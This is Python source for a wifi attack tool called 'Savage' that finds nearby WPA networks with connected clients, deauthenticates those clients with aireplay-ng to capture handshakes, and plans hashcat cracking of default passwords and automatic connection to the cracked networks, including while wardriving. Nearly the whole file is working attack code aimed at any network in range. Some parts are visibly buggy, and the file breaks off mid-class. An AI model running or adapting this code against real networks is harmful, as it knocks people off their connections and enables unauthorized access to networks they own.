"""

    Savage
    Version 0.04
    July 9th, 2021
    
    author:  Joe "Cas" Casanova (joecasanova@gmail.com)
    
    A tool to practically automate acquiring a wifi connection for your kali
    machine.  The entire goal is to allow the user some up-front input options
    and then the script should take it from there and require little-to-no input
    from the user after the initial start-up.
    
    Savage aims to automate handshake collection by looking at SSIDs that have
    clients connected, have a signal strength that is ideal or better, and has
    an SSID that indicates that it may also still have the default password set.
        -Still need to:
            -Develop signal power logic for deciding ideal targets
            -Develop database of known weak default PSK schemas

    Handshake collection can be tweaked to be ideal for wardriving WPA capture
    by reducing the attack timeout and flush time periods to low values.

    *NOT YET IMPLEMENTED*
    Once the handshake is collected, the tool uses hashcat to run a dictionary
    attack against the captured handshake using a custom-crafted dictionary
    that contains all of the possible passwords for that SSID's default 
    PSK-schema.  For example:  Sapphire_[0-9]{5} is a 4G puck that has a 
    default PSK-schema of eight numbers (regex: [0-9]{8}, example: 71876127)
    This limits the default Sapphire puck PSK to 100,000,000 possible PSKs.
    Savage would have hashcat run a brute force with a mask of only eight places
    of numbers against the PSK, which if the Sapphire SSID in question has the 
    default PSK still set, it *WILL* find the PSK that is set in a reasonable
    amount of time.
    
    *NOT YET IMPLEMENTED*
    Once the PSK is found for a SSID within range of the computer running
    Savage... savage then instructs Network Manager to connect to the SSID.
    
    *NOT YET IMPLEMENTED*
    Savage will continue to capture handshakes during this entire process and
    will "ABC" (or Always Be Cracking)... meaning it will be running a crackjob
    using hashcat that is the most probable to be successful in the shortest
    amount of time that it hasn't already run to completion.  Savage will run
    hashing jobs in the order of most probable to crack to least probable.
    
    Savage keeps track of what SSIDs it has captured and what crackjobs it has
    run to completion between sessions.  In order to remove this progress, 
    simply delete the associated .cap files for handshakes or .job files
    for completed crackjobs as it uses the existence of these files to keep
    track of its progress.
        -Still need to:
            -Build cracking functionality.
    
    
    ACKNOWLEDGEMENTS AND THANKS    

    A huge round of gratitude goes to Derv Merkler and the wifite team for much
    inspiration and code referencing of your wonderful tool!  Savage does
    borrow a lot of code from wifite.  I am a big fan of not reinventing the
    wheel.
    
    wifite

    author: derv82 at gmail
    author: bwall @botnet_hunter (ballastsec@gmail.com)
    author: drone @dronesec (ballastsec@gmail.com)
    
    Another stout shout out to the hashcat team for their amazing product.
    Thanks for pushing the envelope of hashing/cracking every single day.
    You are an inspiration to us all to strive for greatness each and everyday!
    
    ToDo:
        - Create working directories if they don't exist OR alert user
            - probably alert by default but have an option to create if they 
            don't exist
        - Build out Client and Target data interpretation for HS target selection
        - Add logical analysis to determine best probable capture targets
        - Integrate a database of known default PSK/SSID schemas
        - Add logic to identify SSIDs that probably have default schema PSKs set
            using above database.
        - Benchmarking for hashcat to determine Time-to-crack estimates
        - fix whitelisting
        - Add capability to manipulate network manager to connect computer to
            cracked SSIDs
"""

from threading import Thread #threading, duh!
#import socket #For future expansion to allow multiple nodes
#from socket import * #For future expansion to allow multiple nodes
import os #file management and getuid
import optparse #option parsing for arguments passed
import re #regex for matching SSIDs in our database
from subprocess import Popen, call, PIPE #process management
from signal import SIGINT, SIGTERM #moar process management
import time #time keeping, sleeping, etc
import csv #csv parsing
from shutil import copy  # Copying .cap files
#import cElementTree as ElementTree #decided to go with CSV parsing like wifite

##########################################################################
#   GLOBAL DEFAULT VARIABLE DEFINITION
##########################################################################

CONFIG={"configPath":"/usr/share/savage/savage.conf",\
    "handshakePath":"/usr/share/savage/hs/",\
    "dictPath":"/usr/share/savage/dicts/",\
    "keyfilePath":"/usr/share/savage/keys/",\
    "jobPath":"/usr/share/savage/jobs/",\
    "tempPath":"/usr/share/savage/tmp/",\
    "attackTimeout":60,\
    "flushTime":300,\
    "capturedSession":0,\
    "maxJobs":8,\
    "lastJob":0,\
    "shutdown":False,\
    "whitelist":['60:38:E0:8C:38:1E']}

def scan():
    ##########################################################################
    #   this beast scans for APs and identifies if they have clients connected.
    #   if it has a client connected it first checks to see if we already have
    #   the handshake in the specified dir
    #   if it doesn't then we pass the metadata to handshake_capture() to do 
    #   our wetwork
    ##########################################################################

    #First a little clean up from a previous run
    start_time = time.time()
    seconds_running = 0
    last_flush = 0
    #remove_airodump_files(CONFIG["tempPath"] + 'savage')
    remove_temp_files(CONFIG["tempPath"])

    print(CONFIG['captureInterface'])

    command = ['airodump-ng',
               '-a',  # only show associated clients
               '--write-interval', '1', # Write every second
               '-w', CONFIG["tempPath"] + 'savage',# output file
               CONFIG["captureInterface"]]
    proc = Popen(command, stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
    debug_log("Starting scan thread: " + " ".join(command))
    print("[!] Scanning thread started with " + str(CONFIG["captureInterface"]))

    CONFIG["shutdown"] = False
    while CONFIG["shutdown"] == False:
        seconds_running = int(time.time() - start_time)
        try:
            time.sleep(0.3)
            if proc.poll() is not None:  # Check if process has finished
                print("Scanning has finished")
                debug_log("Scanning thread has exited.  Restarting.")
                remove_temp_files(CONFIG["tempPath"] + "savage")
                proc = Popen(['airodump-ng', CONFIG["captureInterface"]],\
                    stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
        except KeyboardInterrupt:
            CONFIG["shutdown"] = True
            pass

        (targets, clients) = parse_csv(CONFIG["tempPath"] + '/savage-01.csv')
        ######################################################################
        # targets and clients are a list of target and client classes
        ######################################################################
        # targets class reminder:
        # self.bssid = bssid - Target's MAC Address
        # self.power = power - Positive number, higher is better?
        # self.data = data
        # self.channel = channel
        # self.encryption = encryption
        # self.ssid = ssid
        # self.wps = False  # Default to non-WPS-enabled router.
        # self.key = ''
        ######################################################################
        # clients class reminder:
        # self.bssid = bssid - Client's MAC address
        # self.station = station - Target's MAC Address
        # self.power = power - Client's power in negative dB - higher number is better
        ######################################################################
        os.system('clear')
        #print "Whitelist: " + str(CONFIG["whitelist"])
        #Start looking at the data and outputting some stats
        vulnTargets = []
        if len(targets) > 0:
            header = "APs Detected: " + str(len(targets)) +\
                " - Clients Detected: " + str(len(clients)) +\
                " - Runtime " + sec_to_hms(seconds_running)
            if CONFIG["flushTime"] > 0:
                header = header + " - Last/Next Flush " +\
                    sec_to_hms(seconds_running-last_flush)+ "/" +\
                    sec_to_hms(CONFIG["flushTime"] + last_flush - seconds_running)
            print(header + "\nBSSID\t\t\tSSID\t\t\t\tPower\tData\t"+\
                "Encryption\tClients\tCaptured")        
            vulnTargets = get_targets(targets, clients)
        
        #Client output is disabled because it gets... very large in most cases
        if len(clients) > 0:
            #print "\nBSSID\t\t\tStation\t\t\t\tPower\tSSID"
            for client in clients:
                line = client.bssid + "\t"+client.station + "\t\t" +\
                    str(client.power) + "\t"
                for target in targets:
                    if target.bssid == client.station:
                        line = line + target.ssid
                
        #Now we output the list of APs that have WPA encryption and clients
        targetData = get_target_list(vulnTargets)
        #print str(targetData)
        print("\nTotal Captured Handshakes this session: " +\
            str(CONFIG["capturedSession"]) + \
            "\n\nInterface: " + CONFIG['captureInterface'] + \
            "\n\nOngoing Wetwork: "+\
            "\nJobID\tType\tTime\tBSSID\t\t\tSSID")
        jobs = CONFIG["currentJobs"]
        for a in jobs["jobList"]:
            if not jobs[a]["timeRemain"] > 0 or\
            not CONFIG["currentJobs"][jobID]["thread"].is_alive():
                CONFIG["currentJobs"][jobID]["thread"].join()
                #CONFIG["currentJobs"]["jobList"].remove(a)
            else:
                print(str(a) + "\t" + jobs[a]["type"] + "\t" +\
                    str(jobs[a]["timeRemain"]) +"\t" +\
                    jobs[a]["AP"].bssid + "\t" + jobs[a]["AP"].ssid)

        #Run through the list and see which APs we don't have handshakes for
        #If we don't have a handshake then we attempt to capture it.
        if len(CONFIG["currentJobs"]["jobList"]) < CONFIG["maxJobs"]:
            for a in targetData:
                skip = False
                #print CONFIG["currentJobs"]
                curJobs = CONFIG["currentJobs"]
                for b in CONFIG["currentJobs"]["jobList"]:
                    if curJobs[b]["AP"].bssid == a["ap"].bssid:
                        skip = True
                    #First check to see if a handshake exists for the current target
                if not os.path.exists(CONFIG["handshakePath"] + '/' +\
                    a["ap"].ssid + '-' + a["ap"].bssid + '.cap') and skip == False:
                        #add a list item to CONFIG["currentJobs"]
                        deauthJob = {"type":"Deauth",\
                        "AP":a["ap"],\
                        "Clients":a["clients"],\
                        "timeRemain":CONFIG["attackTimeout"]}
                        jobID = CONFIG["lastJob"] + 1
                        CONFIG["lastJob"] = jobID
                        CONFIG["currentJobs"][jobID] = deauthJob
                        CONFIG["currentJobs"]["jobList"].append(jobID)
                        print(str(jobID) + "\t" + deauthJob["type"] + "\t" +\
                        str(deauthJob["timeRemain"]) + "\t" +\
                        deauthJob["AP"].bssid + "\t" +\
                        deauthJob["AP"].ssid)
                        t = Thread(target=threaded_handshake_capture,\
                            args = (jobID, 1))
                        t.start()
                        CONFIG["currentJobs"][jobID]["thread"]=t

                                                #result = get_handshake(a)
        #Check to see if we have met our flushTime or if it is disabled.
        if (seconds_running - last_flush) >= CONFIG["flushTime"] and CONFIG["flushTime"] > 0:
            debug_log("Flush time has been met.")
            try:
                send_interrupt(proc)
                time.sleep(5)
                remove_temp_files(CONFIG["tempPath"] + 'savage')
            except Exception as e:
                debug_log("Flush failure: " + e)
                continue
            #remove_temp_files(CONFIG["tempPath"])
            #remove_airodump_files(CONFIG["tempPath"] + 'savage')
            proc = Popen(command, stdout=open(os.devnull, 'w'),\
                stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
            last_flush = seconds_running
        
    #User pressed CTRL+C so we are shutting down.
    print("[!] Keyboard Interrupt Detected!  Shutting down!")
    for jobID in CONFIG["currentJobs"]["jobList"]:
        print("[-] Killing  jobID: " + str(jobID))
        debug_log("Killing jobID: " + str(jobID))
        CONFIG["currentJobs"][jobID]["thread"].join()
    print("[-] Killing scanner thread")
    debug_log("Killing scanner thread")
    os.kill(proc.pid, SIGTERM)
    
def threaded_handshake_capture(jobID, junk):
    ##########################################################################
    # Does our wetwork by deauthing clients attached to passed AP
    # and attempting to capture the handshake (do our wetwork)
    # targetData is a dictionary:
    #   targetData["AP"] is a target class
    #   targetData]"clients"] is a list of client classes
    #
    # Intended to be threaded
    ##########################################################################

    start_time = time.time()
    seconds_running = 0
    got_handshake = False
    targetData = {}
    #print CONFIG["currentJobs"][jobID]
    targetData["ap"] = CONFIG["currentJobs"][jobID]["AP"]
    targetData["clients"] = CONFIG["currentJobs"][jobID]["Clients"]
    filename = CONFIG["tempPath"] + str(jobID) + "-wpa-" +\
        targetData["ap"].ssid + "-" + targetData["ap"].bssid
    remove_temp_files(filename)
    #remove_airodump_files(filename) #remove any old .cap files for this ap
    # Start airodump-ng process to capture handshakes
    cmd = ['airodump-ng',
       '-w', filename,
       '-c', targetData["ap"].channel,
       '--write-interval', '1',
       '--bssid', targetData["ap"].bssid,
       CONFIG["captureInterface"]]
    proc_read = Popen(cmd, stdout=open(os.devnull, 'w'),\
        stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
    while seconds_running <= CONFIG["attackTimeout"] and got_handshake == False and CONFIG['shutdown'] == False:
        seconds_running = int(time.time() - start_time)
        CONFIG["currentJobs"][jobID]["timeRemain"] = CONFIG["attackTimeout"] - seconds_running
        for client in targetData["clients"]:
            #print "Deauthing " + client.bssid + " connected to " +\
                #targetData["ap"].ssid + " [" + targetData["ap"].bssid + "]\n"+\
                #"\tTime Elapsed: " + str(seconds_running) + "/" +\
                #str(CONFIG["attackTimeout"]) + " seconds."
            #time.sleep(5)
            try:
                cmd = ['aireplay-ng',
                       '--ignore-negative-one',
                       '-0',  # Attack method (Deauthentication)
                       str(5),  # Number of packets to send
                       '-a', targetData["ap"].bssid,'-h',client.bssid,\
                       CONFIG["captureInterface"]]
                #debug_log('Running deauth command: ' + ' '.join(cmd))
                proc_deauth = Popen(cmd, stdout=open(os.devnull, 'w'),\
                    stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
                proc_deauth.wait()
            except KeyboardInterrupt:
                send_interrupt(proc_read)
                try:
                    send_interrupt(proc_deauth)
                except:
                    continue
                remove_temp_files(filename)
                #remove_airodump_files(filename)
                CONFIG["shutdown"] = True
                return
    debug_log("Attack timed out! Killing airodump instance for jobID: " + str(jobID))
    send_interrupt(proc_read)
    debug_log("Checking for captured handshakes for jobID: " + str(jobID))
    #if not os.path.exists(filename + '-01.cap'): continue
    tempfilename = CONFIG["tempPath"] + str(jobID) + '-wpa-' +\
    targetData["ap"].ssid + "-" +\
    targetData["ap"].bssid + '-01.cap'
    time.sleep(2)
    #copy(filename + '-01.cap', tempfilename)
    from shutil import which
    cap2hccapx = False
    # TO DISABLE the use of cap2hccapx comment out the below line.
    cap2hccapx = which('cap2hccapx')
    prefix = str(jobID) + '-wpa-'
    if cap2hccapx != False:
        #cap2hccapx is installed so we can use that for more accurate handshake detection
        tempFilecap2hccapx = '/tmp/' + '.'.join(''.join(tempfilename.split('/')[-1:]).split('.')[:-1]) + '.hccapx'
        command = 'cap2hccapx "' + tempfilename + '" "' + tempFilecap2hccapx + '" 2>&1'
        debug_log('Checking for handshake with: ' + command)
        output = os.popen(command).read()
        #debug_log('cap2hccapx output: ' + output)
        badFile = False
        for line in output.split('\n'):
            if "Networks detected: 0" in line:
                debug_log('No handshake found for ' + targetData['ap'].ssid + '-' + targetData['ap'].bssid)
                badFile = True
                break
            if "Written 0" in line:
                #print(line)
                debug_log('No handshake! Removing: "' + tempFilecap2hccapx + '"')
                os.popen('rm "' + tempFilecap2hccapx + '"')
                badFile = True
                break
        if badFile == False:
            newTemp = CONFIG['handshakePath'] + targetData['ap'].ssid + '-' + targetData['ap'].bssid + '.hccapx'
            rename(tempFilecap2hccapx, newTemp)
            debug_log('Handshake converted to hccapx: ' + newTemp)
            CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
    else:
        # we fall back to aircrack-ng
        crack = 'aircrack-ng -a 2 -w ./wordlist -b ' +\
        targetData["ap"].bssid +\
        " '" + tempfilename + "'"
        debug_log('Checking for handshake with: ' + crack)
        proc_crack = Popen(crack, stdout=PIPE,\
        stderr=open(os.devnull, 'w'), preexec_fn=os.setsid)
        proc_crack.wait()
        txt = proc_crack.communicate()[0]
        #debug_log("Aircrack output: " + txt.decode('utf-8'))
        got_handshake = txt.decode('utf-8').find('KEY NOT FOUND') != -1
        if got_handshake:
            debug_log("Captured handshake for: " + str(targetData["ap"].ssid))
            newfilename = CONFIG["handshakePath"] + '/' + targetData["ap"].ssid +\
            '-' + targetData["ap"].bssid + '.cap'
            rename(tempfilename, newfilename.replace(prefix,''))
            CONFIG["capturedSession"] = CONFIG["capturedSession"] + 1
        else:
            debug_log("Handshake not found in " + tempfilename)
    CONFIG["currentJobs"]["jobList"].remove(jobID)
    remove_temp_files(filename)
    #remove_airodump_files(filename)
    return
    
def get_target_list(vulnTargets):

    ##########################################################################
    # Generates target pair data and filters out any that have already been
    # captured.  This can probably be folded into get_targets() due to similiar
    # functionality.
    ##########################################################################

        targetData = []
        if len(vulnTargets) > 0:
            print("\nTarget Pairs: " + str(len(vulnTargets)))
            print("SSID\t\t\tBSSID\t\t\tClient\t\t\tAP Power\tClient Power")
            for pair in vulnTargets:
                target = pair[0]
                client = pair[1]
                if pair[2] == True: continue #Don't list captured AP HSs as targets
                exists = False
                for x in range(0,len(targetData)):
                    if targetData[x]["ap"].bssid == target.bssid:
                        exists = True
                        targetData[x]["clients"].append(client)
                        break
                if exists == False:
                    captured = False
                    if os.path.exists(CONFIG["handshakePath"] + '/' + \
                target.ssid + '-' + target.bssid + '.cap') or \
                os.path.exists(CONFIG["handshakePath"] + '/' + \
                target.ssid + '-' + target.bssid + '.hccapx'):
                        captured = True
                    targetData.append({"ap":target,"clients":[client],\
                    "captured":captured})
                line = target.ssid
                if len(target.ssid) < 24:
                    line = line + "\t"
                if len(target.ssid) < 18:
                    line = line + "\t"
                if len(target.ssid) < 8:
                    line = line + "\t"
                line = line + target.bssid + "\t" +\
                    client.bssid + "\t" + str(target.power) + "\t\t" +\
                    str(client.power)
                print(line)
        return targetData

def get_targets(targets, clients):
    
    ##########################################################################
    # Takes in target and client objects that contain observed APs and clients
    # Determines which are connected and paired together and returns a list
    # of dictionaries that contains the AP data and the associated clients
    # filters out whitelisted MAC addresses    
    ##########################################################################

    vulnTargets = []
    for target in targets:
        captured = False
        whitelist = False
        for x in range(0,len(CONFIG["whitelist"])):
            if target.bssid == CONFIG["whitelist"][x]:
                whitelist = True
        if os.path.exists(CONFIG["handshakePath"] + '/' +\
        target.ssid + '-' + target.bssid + '.cap') or\
        os.path.exists(CONFIG["handshakePath"] + '/' +\
        target.ssid + '-' + target.bssid + '.hccapx'):
                captured = True
        if target.encryption.find("WPA") == -1 or whitelist == True: #Ignore non-WPA APs
            continue
        line = target.bssid + "\t" + target.ssid + "\t"
        if len(target.ssid) < 24:
            line = line + "\t"
        if len(target.ssid) < 18:
            line = line + "\t"
        if len(target.ssid) < 8:
            line = line + "\t"
        line = line + str(target.power) + "\t" + target.data + "\t" +\
            target.encryption
        connectedClients = 0
        for client in clients:
            skip_client = False
            for x in range(0,len(CONFIG["whitelist"])-1):
                if client.bssid == CONFIG["whitelist"][x]:
                    skip_client = True
            if client.station == target.bssid and skip_client == False:
                connectedClients = connectedClients + 1
                if target.encryption.find("WPA") != -1 and captured == False:
                    vulnTargets.append((target,client,captured))
        line = line + "\t\t" + str(connectedClients) + "\t" + str(captured)
        print(line)
    return vulnTargets
    
def parse_csv(filename):
    ##########################################################################
    #   Parses given lines from airodump-ng CSV file.
    #   Returns tuple: List of targets and list of clients.
    #   Also graciously borrowed from the wifite team.
    ##########################################################################
    if not os.path.exists(filename): return ([], [])
    targets = []
    clients = []
    try:
        hit_clients = False
        with open(filename, 'rb') as csvfile:
            targetreader = csv.reader((line.decode('utf-8').replace('\0', '') for line in csvfile), delimiter=',')
            for row in targetreader:
                if len(row) < 2:
                    continue
                if not hit_clients:
                    if row[0].strip() == 'Station MAC':
                        hit_clients = True
                        continue
                    if len(row) < 14:
                        continue
                    if row[0].strip() == 'BSSID':
                        continue
                    enc = row[5].strip()
                    # Ignore non-WPA and non-WEP encryption
                    if enc.find('WPA') == 1: continue
                    if len(enc) > 4:
                        enc = enc[4:].strip()
                    power = int(row[8].strip())

                    ssid = row[13].strip()
                    ssidlen = int(row[12].strip())
                    ssid = ssid[:ssidlen]

                    if power < 0: power += 100
                    t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)
                    targets.append(t)
                else:
                    if len(row) < 6:
                        continue
                    bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())
                    station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())
                    power = row[3].strip()
                    if station != 'notassociated':
                        c = Client(bssid, station, power)
                        clients.append(c)
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))
        return ([], [])

    return (targets, clients)    

def clear_temp_files(baseDir):
    #debug_log('Attempting to delete all contents of directory: ' + baseDir)
    for f in os.listdir(baseDir):
        #print(baseDir + f)
        remove_file(baseDir + f)

def remove_temp_files(prefix):
    ##########################################################################
    #   Removes airodump output files
    #   Graciously borrowed from the wifite team!
    ##########################################################################

    remove_file(prefix + '-01.cap')
    remove_file(prefix + '-01.csv')
    remove_file(prefix + '-01.kismet.csv')
    remove_file(prefix + '-01.kismet.netxml')
    remove_file(prefix + '-01.cap.temp')
    remove_file(prefix + '-01.log.csv')
    #remove_file(prefix + '*')

def remove_file(filename):
    ##########################################################################
    #   Attempts to remove a file. Does not throw error if file is not found.
    #   Also graciously borrowed from the wifite team!
    ##########################################################################

    try:
        #debug_log('Attempting to delete: ' + filename)
        os.remove(filename)
    except OSError:
        pass

def enable_monitor_mode(iface):
    ##########################################################################
    #   puts an interface into monitor mode and returns new iface name
    ##########################################################################
    
    proc = Popen(['iwconfig',iface], stdout=PIPE, stderr=open(os.devnull, 'w'))
    for rawLine in proc.communicate()[0].split(b'\n'):
        line = rawLine.decode('utf-8')
        print(line)
        if len(line) == 0: continue
        if line.find('No such device') != -1:
            #No such device, inform the user and exit
            print("[!] No such device!  Check your -i option!")
            exit(0)
        if ord(str(line)[0]) != 32:  # Doesn't start with space
            if iface == line[:line.find(' ')]:
                if line.find('Mode:Monitor') != -1:
                    #The interface is already in monitor mode
                    print("[+] " + str(iface) + " is already in monitor mode.")
                    return iface
                else:
                    #Not in monitor mode so let's put it into monitor mode
                    call(['airmon-ng','start',iface], stdout=PIPE, stderr=open(os.devnull, 'w'))
                #It's not the interface we are looking for so we continue
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=open(os.devnull, 'w'))
    for rawLine in proc.communicate()[0].split(b'\n'):
        line = rawLine.decode('utf-8')
        if len(line) == 0: continue
        if ord(str(line)[0]) != 32:  # Doesn't start with space
            iface = line[:line.find(' ')]  # is the interface
            if line.find('Mode:Monitor') != -1:
                #The interface is now in monitor mode
                print("[+] " + str(iface) + " is now in monitor mode.")
                return iface

def disable_monitor_mode(iface):
    ##########################################################################
    #  takes an interface out of monitor mode and returns new iface name
    #  We will just blindly attempt to pull the iface out of monitor mode
    #  because #fuckit and #YOLO
    #  But first we have to actually figure out which phy adapter it is so we can
    #  keep track of the iface and get the new name of the iface after it is back
    #  in managed mode
    ##########################################################################
    debug_log("Disabling monitor mode for: " + iface)
    proc = Popen(['airmon-ng'], stdout=PIPE, stderr=open(os.devnull, 'w'))
    for rawline in proc.communicate()[0].split(b'\n'):
        line = rawline.decode("utf-8")
        if len(line) == 0: continue
        if ord(str(line[0])) != 32:
            if 1 == line.count(iface): #this is the iface
                phy = line[:4]
    call(['airmon-ng','stop',iface], stdout=PIPE, stderr=open(os.devnull,'w'))
    
    #Now that the iface should be out of monitor mode we find the new iface
    #name and return it!
    
    proc = Popen(['airmon-ng'], stdout=PIPE, stderr=open(os.devnull, 'w'))
    for rawline in proc.communicate()[0].split(b'\n'):
        line = rawline.decode("utf-8")
        if len(line) == 0: continue
        if 1 == line.count(phy):  # is the interface
            if line.find('Mode:Managed') == -1:
                #The interface is in Managed mode so we return the new iface name
                iface = line.split('\t')[1]
                print("[+] " + str(iface) + " is now in managed mode.")
                debug_log(str(iface) + " is now in managed mode.")
                return iface

def main():
    ##########################################################################
    #   This function does things and stuff
    #   Mostly administrative stuff to set up the script for success
    ##########################################################################

    # are we running as root?  If not, inform the user and exit
    if os.getuid() != 0:
        print("[!] Exiting.  Savage must be run as root!")
        exit(1)
        
    if not program_exists('aircrack-ng'):
        print("aircrack-ng is not installed!  Program exiting!")
        exit(1)
    if not program_exists('airodump-ng'):
        print("airodump-ng is not installed!  Program exiting!")    
        exit(1)
    if not program_exists('aireplay-ng'):
        print("aireplay-ng is not installed!  Program exiting!")    
        exit(1)
    if not program_exists('airmon-ng'):
        print("airmon-ng is not installed!  Program exiting!")    
        exit(1)

        
    #capture arguments passed
    parser = optparse.OptionParser('Usage: python savage.py -i <CaptureInterface> <options>'+\
        "\nFor additional information run 'python savage.py -h'")
        
    parser.add_option('-a', dest='attackTimeout', type = 'int',\
        help = 'Sets deauth attack timeout in seconds.  ' +\
        'This is how long to spend attempting to deauth each client. ' +\
        'DEFAULT: ' + str(CONFIG["attackTimeout"]))
    parser.add_option('-c', dest='configPath', type='string',\
        help='Sets path and filename to use as a configuration')
    parser.add_option('--create-dirs', dest='createDirs', action='store_true',\
        default = False, help = 'Creates any paths that do not exist.  '+
        'DEFAULT:  False')        
    parser.add_option('-d', dest='dictPath', type='string',\
        help='Sets path to use for storage of dictionary files.  '+\
        'DEFAULT: ' + CONFIG["dictPath"])
    parser.add_option('-f', dest='flushTime', type = 'int',\
        help = 'Sets period in second to flush scan data and start fresh.  '+\
        'Set to low value if scanning on the move or high value if stationary.  '+\
        'Set to 0 to disable scan data flush.  '+\
        'DEFAULT: ' + str(CONFIG["flushTime"]))
    parser.add_option('-i', dest='captureInterface', type='string',\
        help='Sets a wireless interface to use for handshake capture')
    parser.add_option('-j', dest='jobPath', type='string',\
        help='Sets path for jobfile directory.  '+\
        'DEFAULT: ' + CONFIG["jobPath"])
    parser.add_option('-k', dest='keyfilePath', type='string',\
        help='Sets path for keyfile directory.  '+\
        'DEFAULT: ' + CONFIG["keyfilePath"])
    parser.add_option('-m', dest='maxJobs', type = 'int',\
        help = 'Sets the maximum amount of deauth jobs that can be run at once.  '+\
        'DEFAULT: ' + str(CONFIG["maxJobs"]))
    parser.add_option('-n', dest='connectInterface', type='string',\
        help='Sets wireless interface to control with Network Manager.  '+\
        'NOTE:  A second wireless NIC is ideal so that one can continue'+\
        ' to collect handshakes while the second can be used to connect.'+\
        '  The wireless NIC being used for handshake capture must be in monitor'+\
        ' mode in order to successfully capture handshakes.')        
    parser.add_option('-s', dest='handshakePath', type='string',\
        help='Sets path to WPA handshake capture directory.  '+\
        'DEFAULT: ' + CONFIG["handshakePath"])
    parser.add_option('-t', dest='tempPath', type = 'string',\
        help = 'Sets the path for temporary files.  Temporary files are'+\
        'cleaned up after and during each run of the program.  '+\
        'DEFAULT: ' + CONFIG["tempPath"])
    parser.add_option('-w', dest='whiteList', type='string',\
        help='Comma deliminated list of MAC addresses to white list.  '+\
        'Any MAC address will not be attacked or deauthed.  Clients or APs '+\
        'can be specified.  NOTE:  Invalid MAC addresses are ignored')
        
    (options, args) = parser.parse_args()
    
    CONFIG["currentJobs"] = {"jobList":[]}
    
    if options.captureInterface == None:
        print("A capture interface is required!!")
        print(parser.usage)
        exit(0)
    else:
        CONFIG["captureInterface"] = options.captureInterface
    if options.configPath != None:
        CONFIG["configPath"] = options.configPath
    if options.handshakePath != None:
        CONFIG["handshakePath"] = options.handshakePath
    if options.dictPath != None:
        CONFIG["dictPath"] = options.dictPath
    if options.connectInterface != None:
        CONFIG["connectInterface"] = options.connectInterface
    else:
        CONFIG["connectInterface"] = CONFIG["captureInterface"]
    if options.keyfilePath != None:
        CONFIG["keyfilePath"] = options.keyfilePath
    if options.jobPath != None:
        CONFIG["jobPath"] = options.jobPath
    if options.attackTimeout != None:
        CONFIG["attackTimeout"] = options.attackTimeout
    if options.flushTime !=None:
        CONFIG["flushTime"] = options.flushTime
    if options.maxJobs != None:
        CONFIG["maxJobs"] = options.maxJobs
    if options.tempPath != None:
        CONFIG["tempPath"] = options.tempPath
    if options.whiteList != None:
        #Whitelist is not empty so we turn the string into a list
        #Also clean it up and either add colons every two spaces or replace
        #hyphens with commas
        tempList = options.whiteList.replace("-",":").split(",")
        for x in tempList:
            if re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", x.lower()):
                if len(x) == 12:
                    #MAC doesn't have colons... so we add them!
                    z = ""
                    for y in range(0,11,2):
                        z = z + x[y:y+2] + ":"
                    CONFIG["whitelist"].append(z[:17].upper())
                else:
                    CONFIG["whitelist"].append(x.upper())
        time.sleep(5)

    CONFIG["createDirs"] = options.createDirs
    #Check working paths - if CONFIG["createDirs"] is true then they are created
    check_path_dirs()
    debug_log("Clearing any previous temp files")
    clear_temp_files(CONFIG["tempPath"])

        
    #put the capture interface into monitor mode
    CONFIG["captureInterface"] = enable_monitor_mode(CONFIG["captureInterface"])
    

    file = open('/usr/share/savage/savage-debug.log','w+')
    file.close()
    with open('./wordlist','w+') as wordlist:
        wordlist.write('password')
    # now call scan() to get started.
    scan()

    ##########################################################################
    #   program is ending... let's do some clean up!
    ##########################################################################
    
    #Pull the Capture Interface out of monitor mode.
    CONFIG["captureInterface"] = disable_monitor_mode(CONFIG["captureInterface"])
    
    #finally exit... probably not needed but I have OCD so let's do it anyway.
    exit(0)
    
def check_path_dirs():
    ##########################################################################
    # Checks all directories for all paths in CONFIG
    # If CONFIG["createDirs"] is false then we exit if any do not exist
    # If CONFIG["createDirs"] is true then we create them and continue
    ##########################################################################
    
    if CONFIG["createDirs"] == False:
        if not os.path.exists(CONFIG["handshakePath"]):
            print("[!] " + CONFIG["handshakePath"] + " does not exist!  Exiting!")
            print("[!] pass --create-dirs to force directory creation!")
            exit(0)

        if not os.path.exists(CONFIG["dictPath"]):
            print("[!] " + CONFIG["dictPath"] + " does not exist!  Exiting!")
            print("[!] pass --create-dirs to force directory creation!")
            exit(0)

        if not os.path.exists(CONFIG["keyfilePath"]):
            print("[!] " + CONFIG["keyfilePath"] + " does not exist!  Exiting!")
            print("[!] pass --create-dirs to force directory creation!")
            exit(0)

        if not os.path.exists(CONFIG["jobPath"]):
            print("[!] " + CONFIG["jobPathh"] + " does not exist!  Exiting!")
            print("[!] pass --create-dirs to force directory creation!")
            exit(0)

        if not os.path.exists(CONFIG["tempPath"]):
            print("[!] " + CONFIG["tempPath"] + " does not exist!  Exiting!")
            print("[!] pass --create-dirs to force directory creation!")
            exit(0)
        
    else:        

        if not os.path.exists(CONFIG["handshakePath"]):
            try:
                os.makedirs(CONFIG["handshakePath"])
            except:
                print("[!] Could not create " + CONFIG["handshakePath"])
                exit(0)

        if not os.path.exists(CONFIG["dictPath"]):
            try:
                os.makedirs(CONFIG["dictPath"])
            except:
                print("[!] Could not create " + CONFIG["dictPath"])
                exit(0)

        if not os.path.exists(CONFIG["keyfilePath"]):
            try:
                os.makedirs(CONFIG["keyfilePath"])
            except:
                print("[!] Could not create " + CONFIG["keyfilePath"])
                exit(0)

        if not os.path.exists(CONFIG["jobPath"]):
            try:
                os.makedirs(CONFIG["jobPath"])
            except:
                print("[!] Could not create " + CONFIG["jobPath"])
                exit(0)

        if not os.path.exists(CONFIG["tempPath"]):
            try:
                os.makedirs(CONFIG["tempPath"])                
            except:
                print("[!] Could not create " + CONFIG["tempPath"])
                exit(0)
            
class Target:
    """
        Holds data for a Target (aka Access Point aka Router)
    """

    def __init__(self, bssid, power, data, channel, encryption, ssid):
        self.bssid = bssid
        self.power = power
        self.data = data
        self.channel = channel
